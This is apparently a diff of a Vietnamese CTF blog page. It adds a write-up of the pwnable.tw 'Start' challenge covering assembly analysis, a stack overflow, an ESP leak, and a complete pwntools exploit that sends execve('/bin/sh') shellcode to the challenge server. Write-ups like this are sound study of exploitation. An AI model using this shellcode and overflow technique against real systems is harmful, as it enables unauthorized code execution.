@@ -60,7 +60,37 @@
 
     <div class="page-content">
       <div class="wrapper">
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      inlineMath: [['$','$']], 
+    }
+  });
+</script>
+
+<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
+
+<script>
+  /**
+  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
+  
+  var disqus_config = function () {
+  this.page.url = page.url ;  // Replace PAGE_URL with your page's canonical URL variable
+  this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+  };
+  
+  (function() { // DON'T EDIT BELOW THIS LINE
+  var d = document, s = d.createElement('script');
+  s.src = 'https://https-geordo-github-io.disqus.com/embed.js';
+  s.setAttribute('data-timestamp', +new Date());
+  (d.head || d.body).appendChild(s);
+  })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
 
   <header class="post-header">
     <h1 class="post-title" itemprop="name headline">Pwnable.tw</h1>
@@ -68,6 +98,229 @@
   </header>
 
   <div class="post-content" itemprop="articleBody">
+    <h2 id="0x00-giới-thiệu">
+  
+  
+    0x00 Giới thiệu <a href="#0x00-giới-thiệu">#</a>
+  
+  
+</h2>
+    
+<p>Khoảng một tháng trở lại đây, tôi chuyên tâm hơn vào việc chơi pwn. Một phần là vì mảng pwn khó, phần còn lại là tôi nghĩ nó có thể giúp tôi kiếm được tiền :)) Vì là một người mới, những kiến thức mà tôi viết ở đây có thể chưa chính xác hoàn toàn. Rất mong các bạn đọc góp ý để tôi phát triển hơn nữa.</p>
+
+<p><a href="https://pwnable.tw/">Pwnable.tw</a> là một trang luyện tập mảng pwn khá nổi tiếng của Đài Loan. Theo tôi cảm nhận, thử thách ở đây khá khó cho người mới. Nếu các bạn không làm được thì cũng đừng lấy gì làm lạ. Tôi đã mất khoảng hơn 1 tuần để nghiền ngẫm challenge đầu tiên.</p>
+<h2 id="0x01-start">
+  
+  
+    0x01 Start <a href="#0x01-start">#</a>
+  
+  
+</h2>
+    
+<h3 id="i-tổng-quan">
+  
+  
+    I. Tổng quan <a href="#i-tổng-quan">#</a>
+  
+  
+</h3>
+    
+<p><img src="/images/Pwnable.tw/0x01%20Start/start.png" alt="" /></p>
+
+<p>Đề bài cho chúng ta duy nhất một file là <code class="language-plaintext highlighter-rouge">start</code>. Việc đầu tiên tôi thường làm sẽ là kiểm tra xem file là 32 hay 64 bits. Để kiểm tra, tôi thường dùng <code class="language-plaintext highlighter-rouge">file</code>.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file start
+start: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, not stripped
+</code></pre></div></div>
+<p>Thông tin cho chúng ta biết được đây là một file 32 bits. Load chương trình vào IDAPRO x32, quan sát các hàm ở mục <code class="language-plaintext highlighter-rouge">Functions</code>, nhận thấy rằng chương trình chỉ xoay quanh hàm <code class="language-plaintext highlighter-rouge">_start</code>.</p>
+<h3 id="ii-phân-tích">
+  
+  
+    II. Phân tích <a href="#ii-phân-tích">#</a>
+  
+  
+</h3>
+    
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>push    esp
+push    offset _exit
+xor     eax, eax
+xor     ebx, ebx
+xor     ecx, ecx
+xor     edx, edx
+push    3A465443h
+push    20656874h
+push    20747261h
+push    74732073h
+push    2774654Ch
+mov     ecx, esp        ; addr
+mov     dl, 14h         ; len
+mov     bl, 1           ; fd
+mov     al, 4
+int     80h             ; LINUX - sys_write
+xor     ebx, ebx
+mov     dl, 3Ch ; '&lt;'
+mov     al, 3
+int     80h             ; LINUX -
+add     esp, 14h
+retn
+</code></pre></div></div>
+
+<p>Mã assembly của hàm <code class="language-plaintext highlighter-rouge">_start</code> rất dễ đọc, chúng ta sẽ đi phân tích nội dung từng đoạn code.</p>
+
+<p>Việc đầu tiên là đẩy thanh ghi <code class="language-plaintext highlighter-rouge">ESP</code> và offset của hàm <code class="language-plaintext highlighter-rouge">_exit</code> vào trong stack. Sau đó, gán giá trị của 4 thanh ghi <code class="language-plaintext highlighter-rouge">EAX, EBX, ECX, EDX = 0</code>. Tiếp theo là đẩy các giá trị <code class="language-plaintext highlighter-rouge">3A465443h, 20656874h, 20747261h, 74732073h, 2774654Ch</code> vào trong stack.</p>
+
+<p>Câu hỏi đặt ra ở đây là 5 con số trên là gì vậy? Rất đơn giản, nó chính là:</p>
+<ul>
+  <li>3A465443h = “:FTC”</li>
+  <li>20656874h = “ eht”</li>
+  <li>20747261h = “ tra”</li>
+  <li>74732073h = “ts s”</li>
+  <li>2774654Ch = “‘teL”</li>
+</ul>
+
+<p>Chúng đại diện cho chuỗi “<strong>Let’s start the CTF:</strong>”</p>
+
+<p>Đoạn mã tiếp theo, chương trình gọi ra 2 system call là sys_write và sys_read</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov     ecx, esp        ; addr
+mov     dl, 14h         ; len
+mov     bl, 1           ; fd
+mov     al, 4
+int     80h             ; LINUX - sys_write
+</code></pre></div></div>
+
+<p>Thông tin system call</p>
+<ul>
+  <li>Đọc chuỗi từ địa chỉ ESP hiện tại</li>
+  <li>Độ dài: 0x14 bytes</li>
+  <li>File descriptor: stdout</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xor     ebx, ebx
+mov     dl, 3Ch ; '&lt;'
+mov     al, 3
+int     80h             ; LINUX -
+</code></pre></div></div>
+
+<p>Thông tin system call</p>
+<ul>
+  <li>Đọc số byte: 0x3C</li>
+</ul>
+
+<p>Đoạn mã cuối cùng tăng giá trị thanh <code class="language-plaintext highlighter-rouge">ESP</code> lên 0x14 đơn vị. <code class="language-plaintext highlighter-rouge">retn</code> gọi địa chỉ thanh ghi <code class="language-plaintext highlighter-rouge">ESP</code> đang giữ rồi cộng <code class="language-plaintext highlighter-rouge">ESP</code> lên 4 đơn vị.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>add     esp, 14h
+retn
+</code></pre></div></div>
+<h3 id="iii-lỗ-hổng">
+  
+  
+    III. Lỗ hổng <a href="#iii-lỗ-hổng">#</a>
+  
+  
+</h3>
+    
+
+<p>Chúng ta cùng nhìn qua cấu trúc của stack trước khi gọi 2 system call.</p>
+
+<p><img src="/images/Pwnable.tw/0x01%20Start/image.png" alt="Alt text" /></p>
+
+<p>Giá trị của thanh ghi <code class="language-plaintext highlighter-rouge">ESP</code> ở:</p>
+<ul>
+  <li>Hiện tại:  <code class="language-plaintext highlighter-rouge">0xFFFFD124</code></li>
+  <li>Ban đầu:  <code class="language-plaintext highlighter-rouge">0xFFFFD140</code></li>
+</ul>
+
+<p>Chú ý rằng, thường các challenge sẽ bật <strong>Address Space Layout Randomization</strong> nên giá trị thanh ghi <code class="language-plaintext highlighter-rouge">ESP</code> ban đầu luôn có giá trị ngẫu nhiên. (Đây là lý do vì sao mình không lấy <code class="language-plaintext highlighter-rouge">ESP = 0xFFFFD140</code> để khai thác lỗ hổng)</p>
+
+<p>Như ta đã phân tích ở trên, <code class="language-plaintext highlighter-rouge">sys_read</code> cho phép đọc 60 bytes vào stack. Nếu chúng đã nhập vào 20 bytes, thì từ địa chỉ <code class="language-plaintext highlighter-rouge">0xFFFFD124</code> đến <code class="language-plaintext highlighter-rouge">0xFFFFD134</code> sẽ được fill đủ. Giả sử chúng ta tiếp tục nhập vào, các giá trị tại các địa chỉ trên nó sẽ bị thay đổi.</p>
+<h3 id="iv-hướng-tấn-công">
+  
+  
+    IV. Hướng tấn công <a href="#iv-hướng-tấn-công">#</a>
+  
+  
+</h3>
+    
+
+<p>Công việc chúng ta cần thực hiện:</p>
+<ol>
+  <li>Lấy được địa chỉ thanh ghi <code class="language-plaintext highlighter-rouge">ESP</code> ban đầu.</li>
+  <li>Từ việc có được giá trị thanh ghi <code class="language-plaintext highlighter-rouge">ESP</code> ban đầu, chúng ta sẽ đưa địa chỉ trả về của hàm là địa chỉ của shellcode.</li>
+</ol>
+<h3 id="công-việc-1">
+  
+  
+    Công việc 1 <a href="#công-việc-1">#</a>
+  
+  
+</h3>
+    
+<p><img src="/images/Pwnable.tw/0x01%20Start/image-1.png" alt="Alt text" /></p>
+
+<p>Để lấy giá trị của thanh ghi <code class="language-plaintext highlighter-rouge">ESP</code> ban đầu rất đơn giản. Chúng ta nhập đủ 20 bytes để lấp đầy địa chỉ từ <code class="language-plaintext highlighter-rouge">0xFFFFD124</code> đến <code class="language-plaintext highlighter-rouge">0xFFFFD134</code>, tiếp tục ghi thêm 4 bytes <code class="language-plaintext highlighter-rouge">0x08048087</code> để chương trình có thể gọi system call read và write lần thứ 2.</p>
+
+<p>Bây giờ, giá trị của thanh ghi <code class="language-plaintext highlighter-rouge">ESP</code> sẽ là: <code class="language-plaintext highlighter-rouge">0xFFFFD124 + 0x14 + 0x4 = 0xFFFFD13C</code>. Chú ý, đây cũng là nơi chứa giá trị thanh ghi <code class="language-plaintext highlighter-rouge">ESP</code> ban đầu.</p>
+
+<p>Lợi dụng việc gọi <code class="language-plaintext highlighter-rouge">sys_write</code> lần thứ 2. Chỉ cần in ra 4 bytes đầu tiên, chúng ta sẽ lấy được địa chỉ <code class="language-plaintext highlighter-rouge">ESP</code> ban đầu.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">':'</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span> 
+<span class="n">esp_leaked</span> <span class="o">=</span> <span class="nf">u32</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="nf">recv</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
+</code></pre></div></div>
+<h3 id="công-việc-2">
+  
+  
+    Công việc 2 <a href="#công-việc-2">#</a>
+  
+  
+</h3>
+    
+
+<p>Sau khi đã có địa chỉ <code class="language-plaintext highlighter-rouge">ESP</code> ban đầu. Việc của chúng ta là phải tính toán xem phải input bao nhiêu ký tự để chương trình có thể thực thi được shellcode.</p>
+
+<p>Gọi địa chỉ <code class="language-plaintext highlighter-rouge">ESP</code> ban đầu là <code class="language-plaintext highlighter-rouge">ESP = X</code>, giá trị hiện tại <code class="language-plaintext highlighter-rouge">ESP = X - 4</code></p>
+
+<p><img src="/images/Pwnable.tw/0x01%20Start/image-2.png" alt="Alt text" /></p>
+
+<p>Sau khi <code class="language-plaintext highlighter-rouge">sys_read</code> được gọi, <code class="language-plaintext highlighter-rouge">ESP + 0x14</code>, nghĩa là <code class="language-plaintext highlighter-rouge">ESP</code> đứng ở <code class="language-plaintext highlighter-rouge">X + 16</code>. Ở <code class="language-plaintext highlighter-rouge">X + 16</code>, chúng ta chỉ cần gán cho nó giá trị là <code class="language-plaintext highlighter-rouge">X + 20</code>, nơi shellcode được viết. Hàm trả về sẽ là địa chỉ shellcode được bắt đầu.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">leaked_esp</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
+</code></pre></div></div>
+<h3 id="v-mã-khai-thác">
+  
+  
+    V. Mã khai thác <a href="#v-mã-khai-thác">#</a>
+  
+  
+</h3>
+    
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s">"</span> 
+
+<span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">':'</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span> 
+<span class="n">esp_leaked</span> <span class="o">=</span> <span class="nf">u32</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="nf">recv</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="n">esp_leaked</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
+<span class="n">r</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<h3 id="vi-tham-khảo">
+  
+  
+    VI. Tham khảo <a href="#vi-tham-khảo">#</a>
+  
+  
+</h3>
+    
+<ol>
+  <li><a href="https://hackmd.io/@y198/ry6GrF3gi">Pwnable.tw - Start @y198</a></li>
+  <li><a href="https://blog.csdn.net/weixin_43483799/article/details/113844032">Pwnable.tw - Start @c01dkit</a></li>
+</ol>
     <h2 id="0x00-giới-thiệu">0x00 Giới thiệu</h2>
 <p>Khoảng một tháng trở lại đây, tôi chuyên tâm hơn vào việc chơi pwn. Một phần là vì mảng pwn khó, phần còn lại là tôi nghĩ nó có thể giúp tôi kiếm được tiền :)) Vì là một người mới, những kiến thức mà tôi viết ở đây có thể chưa chính xác hoàn toàn. Rất mong các bạn đọc góp ý để tôi phát triển hơn nữa.</p>
 
@@ -233,39 +486,9 @@ retn
 
   </div>
 
-  <script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-      tex2jax: {
-        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
-        inlineMath: [['$','$']], 
-      }
-    });
-</script>
+  <div id="disqus_thread"></div>
 
-<div id="disqus_thread"></div>
-<script>
-    /**
-    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
-    
-    var disqus_config = function () {
-    this.page.url = page.url ;  // Replace PAGE_URL with your page's canonical URL variable
-    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-    };
-    
-    (function() { // DON'T EDIT BELOW THIS LINE
-    var d = document, s = d.createElement('script');
-    s.src = 'https://https-geordo-github-io.disqus.com/embed.js';
-    s.setAttribute('data-timestamp', +new Date());
-    (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-
-<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
-  <!-- <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script> -->
 </article>
-
       </div>
     </div>
 
